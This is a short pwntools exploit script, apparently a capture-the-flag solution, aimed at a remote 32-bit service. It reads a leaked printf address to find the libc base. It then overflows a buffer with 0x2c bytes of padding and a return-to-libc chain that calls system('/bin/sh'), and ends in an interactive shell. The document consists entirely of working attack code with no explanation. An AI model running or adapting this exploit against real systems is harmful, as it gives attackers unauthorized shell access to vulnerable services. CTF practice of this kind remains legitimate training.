from pwn import *

REMOTE_IP = "1cfac3a.678470.xyz"
REMOTE_PORT = 32572

libc = ELF("./libc.so.6")

p = remote(REMOTE_IP, REMOTE_PORT)

p.readuntil(b"libc... ")

leak = int(p.readline().decode(), 16)
libc.address = leak - libc.sym["printf"]

log.success(f"libc: {hex(libc.address)}")

payload = b"A" * 0x2c
payload += p32(0x0804900e) # ret < 0x90000000
payload += p32(libc.sym["system"])
payload += p32(0)
payload += p32(next(libc.search(b"/bin/sh")))

p.sendline(payload)

p.interactive()
